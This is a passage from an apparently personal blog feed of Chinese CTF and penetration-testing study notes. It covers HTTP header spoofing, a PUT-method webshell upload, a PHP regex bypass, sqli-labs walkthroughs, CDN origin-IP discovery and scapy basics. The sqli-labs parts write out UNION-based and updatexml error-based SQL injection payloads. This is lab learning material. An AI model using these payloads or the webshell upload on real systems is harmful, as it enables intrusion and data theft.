src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240104213334105.png" alt="image-20240104213334105"></p><p>出现了新的东西</p><p>最后就直接访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240104213420519.png" alt="image-20240104213420519"></p><h2 id="LitCTF-2023-Http-pro-max-plus"><a href="#LitCTF-2023-Http-pro-max-plus" class="headerlink" title="[LitCTF 2023]Http pro max plus"></a>[LitCTF 2023]Http pro max plus</h2><p><strong>0x00</strong></p><p> 探姬老师挺有趣的</p><p>使用的知识点：</p><blockquote><ol><li>http中本地访问不只有XFF(X-Forwarded-For)还可以使用client-ip</li><li>代理使用via</li><li></li></ol></blockquote><p>整体来说，只要跟着走就行了</p><p><strong>0x01</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240112222829652.png" alt="image-20240112222829652"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240112222841082.png" alt="image-20240112222841082"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240112222850599.png" alt="image-20240112222850599"></p><p>那就换一个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240112222940322.png" alt="image-20240112222940322"></p><p><strong>0x02</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240112223041025.png" alt="image-20240112223041025"></p><p><strong>0x03</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240112223104527.png" alt="image-20240112223104527"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240112223122500.png" alt="image-20240112223122500"></p><p><strong>0x03</strong></p><p>使用前面提到的via</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240112223203119.png" alt="image-20240112223203119"></p><h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><p>0x00</p><p>这道题主要是学会使用nikto的用法，和一个web题的做题顺序</p><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240129193922732.png" alt="image-20240129193922732"></p><p>拿到这道题没有什么思路</p><p>就先是使用工具dirsearch 扫描了一下目录，并没有什么东西</p><p>尝试使用nikto</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240129194208127.png" alt="image-20240129194208127"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240129194234223.png" alt="image-20240129194234223"></p><p>发现存在put</p><p>[PUT和POST的区别-阿里云开发者社区 (aliyun.com)](<a href="https://developer.aliyun.com/article/1205901#:~:text=PUT">https://developer.aliyun.com/article/1205901#:~:text=PUT</a> 请求是 HTTP 协议中的一种请求方法，通常用于更新或替换服务器上的资源。,使用 PUT 请求时，客户端需要将整个资源的新版本发送到服务器。 如果服务器上已存在该资源，则用客户端提交的新版本替换原有的资源。 如果该资源不存在，则会创建一个新的资源。)</p><p>然后就尝试利用put</p><p>0x02</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240129195942012.png" alt="image-20240129195942012"></p><p>修改请求的方法，然后添加文件名字，最后添加一句话木马就好了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240129200024116.png" alt="image-20240129200024116"></p><h2 id="SWPUCTF-2022-新生赛-xff"><a href="#SWPUCTF-2022-新生赛-xff" class="headerlink" title="[SWPUCTF 2022 新生赛]xff"></a>[SWPUCTF 2022 新生赛]xff</h2><p>0x00</p><p>这道题比较简单，但是不得不说，还有很多东西不知道</p><p>0x01</p><p>就直接说不知道的点</p><p>主页面跳转</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130205602347.png" alt="image-20240130205602347"></p><h2 id="SWPUCTF-2022-新生赛-numgame"><a href="#SWPUCTF-2022-新生赛-numgame" class="headerlink" title="[SWPUCTF 2022 新生赛]numgame"></a>[SWPUCTF 2022 新生赛]numgame</h2><p>0x00</p><p>使用知识点</p><ul><li>post替代get</li><li>数组绕过preg_match</li><li>解除禁用F12</li></ul><p>0x01</p><p>首先可以访问页面，发现不能使用F12尝试禁用js</p><p>0x02</p><p>就看见到了这道题的真面目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//hint: 与get相似的另一种请求协议是什么呢</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">nss</span></span>&#123;<br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctf</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./hint2.php&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/n|c/m&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>], <span class="hljs-variable">$matches</span>))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>    <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用数组来绕过preg_match函数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240130220338420.png" alt="image-20240130220338420"></p><p>将类换成nss2</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240130220451096.png" alt="image-20240130220451096"></p><p>然后查看源码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240130220512322.png" alt="image-20240130220512322"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-web入门</title>
    <link href="/2024/01/02/CTF/ctf-web%E5%85%A5%E9%97%A8/"/>
    <url>/2024/01/02/CTF/ctf-web%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>想好好学一下ctf，这个只是入门部分，但是可能后面大多都是刷题记录</p><h1 id="基础知识篇章"><a href="#基础知识篇章" class="headerlink" title="基础知识篇章"></a>基础知识篇章</h1><h2 id="做题经验"><a href="#做题经验" class="headerlink" title="做题经验"></a>做题经验</h2><ol><li>关注源码里面的注释</li><li>接受包里面的注释</li><li>注意网络里面有可能存在其他的文件，可以访问，然后可能存在有效的信息</li><li></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>poc编写</title>
    <link href="/2024/01/02/%E6%B8%97%E9%80%8F/poc%E7%BC%96%E5%86%99/"/>
    <url>/2024/01/02/%E6%B8%97%E9%80%8F/poc%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>关于xray 脚本的编写，参考</p><blockquote><p><a href="https://docs.xray.cool/#/guide/">https://docs.xray.cool/#/guide/</a>  </p><p><a href="https://stack.chaitin.com/techblog/detail?id=50">https://stack.chaitin.com/techblog/detail?id=50</a></p></blockquote><p>编写工具</p><blockquote><p><a href="https://poc.xray.cool/">规则实验室 - XRAY</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql-labs</title>
    <link href="/2023/12/26/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/sql-labs/"/>
    <url>/2023/12/26/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/sql-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h1><ol><li>判断是否字符型还是数字型</li><li>字段数</li><li>显示位</li><li>获取当前数据库</li><li>获取当前表名</li><li>获取所有字段</li><li>获取数据</li></ol><h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><ol><li><p>判读是否是字符型还是数字型（猜闭合）</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226100831546.png" alt="image-20231226100831546"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226101205075.png" alt="image-20231226101205075"></p><p>可以看出来，这个是字符型</p></li><li><p>看字段数</p><p>使用order by</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226101307234.png" alt="image-20231226101307234"></p></li><li><p>判读回显位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select 1,2,3 ....<br></code></pre></td></tr></table></figure><p>最好还是和查询到的字段数相等</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226101538793.png" alt="image-20231226101538793"></p></li><li><p>获取当前数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,database(),version()<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226101715713.png" alt="image-20231226101715713"></p></li><li><p>查找需要的表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;<br></code></pre></td></tr></table></figure><p>注意这个地方是 table_schema</p><p>也就是说，如果我们要更具某一个数据库找到他的表名，我们使用table_schema来限定数据库的名字</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226102521173.png" alt="image-20231226102521173"></p></li><li><p>爆破字段名</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226102808283.png" alt="image-20231226102808283"></p></li><li><p>找到需要的进行查询</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226102954790.png" alt="image-20231226102954790"></p></li></ol><h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><ol><li><p>判断什么类型</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226103536181.png" alt="image-20231226103536181"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226103550574.png" alt="image-20231226103550574"></p></li><li><p>判断字段数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226103810348.png" alt="image-20231226103810348"></p></li><li><p>判断显示位</p><blockquote><p><a href="http://127.0.0.1/sqlilabs/Less-2/?id=-1">http://127.0.0.1/sqlilabs/Less-2/?id=-1</a> union select 1,2,3 –+</p></blockquote></li><li><p>判断数据库名</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226104036025.png" alt="image-20231226104036025"></p></li><li><p>测表名</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226104218622.png" alt="image-20231226104218622"></p></li><li><p>查字段名</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226104358065.png" alt="image-20231226104358065"></p></li><li><p>查具体的信息</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226104604471.png" alt="image-20231226104604471"></p></li></ol><h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><ol><li><p>判断是什么类型</p><blockquote><p>?id&#x3D;1’</p></blockquote><p>出现了错误，然后看报错</p><p>提示添加<code>)</code></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226194535270.png" alt="image-20231226194535270"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226194741537.png" alt="image-20231226194741537"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231226194757295.png" alt="image-20231226194757295"></p></li><li><p>查询字段</p></li><li><p>查询显示位</p></li><li><p>查数据库名</p></li><li><p>查表名</p></li><li><p>查具体信息</p></li></ol><h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h1><ol><li><p>判断是什么类型</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/sql_labs/image-20240109200033028.png" alt="image-20240109200033028"></p></li><li><p>开始爆破数据库</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/sql_labs/image-20240109202818453.png" alt="image-20240109202818453"></p><blockquote><p><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1">http://127.0.0.1/sqlilabs/Less-5/?id=1</a>‘ and updatexml(0x7e,concat(‘<del>‘,(select database()),’</del>‘),0x7e) %23 </p></blockquote></li><li><p>爆破表名</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/sql_labs/image-20240109203052697.png" alt="image-20240109203052697"></p></li><li><p>爆破字段</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/sql_labs/image-20240109203209883.png" alt="image-20240109203209883"></p></li><li><p>然后根据具体获取具体的信息</p></li></ol><h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>直接上sql-map</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/sql_labs/image-20240109203951911.png" alt="image-20240109203951911"></p><p>可以发现他已经将表名和字段已经爆破出来了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/sql_labs/image-20240109204132525.png" alt="image-20240109204132525"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/sql_labs/image-20240109204424593.png" alt="image-20240109204424593"></p><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>这关是时间盲注</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/sql_labs/image-20240109205642884.png" alt="image-20240109205642884"></p><p>停顿了5s</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/sql_labs/image-20240109205901001.png" alt="image-20240109205901001"></p><h1 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/sql_labs/image-20240109210345014.png" alt="image-20240109210345014"></p><p>用户名存在普通的联合注入</p>]]></content>
    
    
    
    <tags>
      
      <tag>靶场记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞总结</title>
    <link href="/2023/12/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞的学习方法"><a href="#漏洞的学习方法" class="headerlink" title="漏洞的学习方法"></a>漏洞的学习方法</h1><p>形成原因  -&gt;  挖掘方法  -&gt;   利用方法  -&gt;  防御方法</p>]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CDN信息收集</title>
    <link href="/2023/12/25/%E6%B8%97%E9%80%8F/CDN%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2023/12/25/%E6%B8%97%E9%80%8F/CDN%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="CDN-信息收集"><a href="#CDN-信息收集" class="headerlink" title="CDN 信息收集"></a>CDN 信息收集</h1><h2 id="CDN判断"><a href="#CDN判断" class="headerlink" title="CDN判断"></a>CDN判断</h2><h3 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h3><blockquote><p>  <a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a>  </p></blockquote><p>  用各种多地 ping 的服务，查看对应 IP 地址是否唯一  </p><h3 id="国外访问"><a href="#国外访问" class="headerlink" title="国外访问"></a>国外访问</h3><blockquote><p>  <a href="https://ping.eu/ping/">https://ping.eu/ping/</a>  </p></blockquote><p>  因为有些网站设置CDN可能没有把国外的访问包含进去，所以可以这么绕过  </p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="查询子域名IP"><a href="#查询子域名IP" class="headerlink" title="查询子域名IP"></a>查询子域名IP</h3><blockquote><p>  <a href="https://ip.tool.chinaz.com/ipbatch">https://ip.tool.chinaz.com/ipbatch</a>  </p></blockquote><p>CDN 流量收费高，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一  台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP  </p><h2 id="MX记录邮件服务"><a href="#MX记录邮件服务" class="headerlink" title="MX记录邮件服务"></a>MX记录邮件服务</h2><p>MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务  器IP将在MX记录中。  </p><h2 id="查询历史DNS记录"><a href="#查询历史DNS记录" class="headerlink" title="查询历史DNS记录"></a>查询历史DNS记录</h2><blockquote><p>  <a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a>  </p></blockquote><p>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录;  </p><p>域名注册完成后首先需要做域名解析，域名解析就是把域名指向网站所在服务器的IP，让人们通过注册的域名可以访问到网站。  </p><p>IP地址是网络上标识服务器的数字地址，为了方便记忆，使用域名来代替IP地址。  域名解析就是域名到IP地址的转换过程，域名的解析工作由DNS服务器完成。  DNS服务器会把域名解析到一个IP地址，然后在此IP地址的主机上将一个子目录与域名绑定。  域名解析时会添加解析记录，这些记录有：A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录。  DNS记录类型  </p><blockquote><p>  <a href="https://developer.aliyun.com/article/331012">https://developer.aliyun.com/article/331012</a>  </p></blockquote><p>对于检测CDN来说最重要的个人觉得是CNAME  CDN的核心技术</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><blockquote><p><a href="https://zhuanlan.zhihu.com/p/52362950">到底什么是CDN？ - 知乎 (zhihu.com)</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XML外部实体注入</title>
    <link href="/2023/12/20/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/12/20/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><p>相比于<code>HTML</code>的展示性语言，<code>XML</code>是和JSON是同一类，<code>XML</code>可以用于传输大量的数据，<code>json</code>大量数据的定义不如<code>XML</code></p><p>通过自定义标签对数据进行组织</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span> #<span class="hljs-comment">&lt;!--XML 声明--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">girls</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">girl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hair</span>&gt;</span>短头发<span class="hljs-tag">&lt;/<span class="hljs-name">hair</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">eye</span>&gt;</span>大眼睛<span class="hljs-tag">&lt;/<span class="hljs-name">eye</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">face</span>&gt;</span>可爱的脸庞<span class="hljs-tag">&lt;/<span class="hljs-name">face</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">summary</span> <span class="hljs-attr">age</span>=<span class="hljs-string">&quot;23&quot;</span>&gt;</span>我最爱的女孩<span class="hljs-tag">&lt;/<span class="hljs-name">summary</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">girl</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">girls</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FTP</title>
    <link href="/2023/12/14/python/FTP/"/>
    <url>/2023/12/14/python/FTP/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这个库用于与FTP交互</p><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><ol><li>使用FTP下载服务器的文件</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CMS漏洞</title>
    <link href="/2023/12/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/CMS%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/12/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/CMS%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>scapy</title>
    <link href="/2023/12/12/python/scapy/"/>
    <url>/2023/12/12/python/scapy/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这个包适用于网络嗅探的非常强大的第三方库,可以用于packet嗅探和伪造packet。在scapy的内部就已经实现了很多的网络协议。比如DNS、ARP、IP、TCP、UDP等等</p><p>我们可以用它操作报文， 可以伪造或者解析多种协议的报文。还具有转发、捕获、匹配请求和响应的功能。</p><p>可以替代<code>hping</code>[^hping]、arpspoof[^arpspoof]、arping[^arping]、p0f[^p0f]。可以替代部分的nmap，tcpdump，tshark的功能</p><h1 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h1><ol><li><p>查看支持的网络协议</p><p>可以使用<code>ls()</code>查看支持什么协议</p></li><li><p>其他比较常见的函数</p><p>还可以用lsc()函数来查看scapy的指令集（函数）。比较常用的函数包括arpcachepoison（用于arp毒化攻击，也叫arp欺骗攻击），arping（用于构造一个ARP的who-has包） ，send(用于发3层报文)，sendp（用于发2层报文）, sniff（用于网络嗅探，类似Wireshark和tcpdump）, sr（发送+接收3层报文），srp（发送+接收2层报文）等等</p></li><li><p>还可以对ls()函数添加参数，比如IP，就可以查看IP包的各种默认的参数</p></li><li><p>构造一个包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=IP(src=,dst=)/TCP()<br></code></pre></td></tr></table></figure></li><li><p>这个包的详细资料</p><p>假设现在使用dst&#x3D;’baidu.com’</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231213112750257.png" alt="image-20231213112750257"></p><p>展示：</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231213112941954.png" alt="image-20231213112941954"></p></li><li><p>发送包</p><p>有多种发送的方式</p><ul><li><p>send()</p><p>发送一个三层的数据包，但是不接受</p></li><li><p>sr1()</p><p>发送一个三层的包，但是接受返回的包</p></li><li><p>srp()</p><p>发送一个两层的包</p></li><li><p>sr2()</p><p>接受两个</p></li></ul><p>现在由于需要接受返回的信息</p><p>我们就需要接受返回的包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231213113358374.png" alt="image-20231213113358374"></p></li><li><p>返回来的包也可以查看信息，和创建的包是一样的</p></li></ol><h1 id="python-中使用scapy"><a href="#python-中使用scapy" 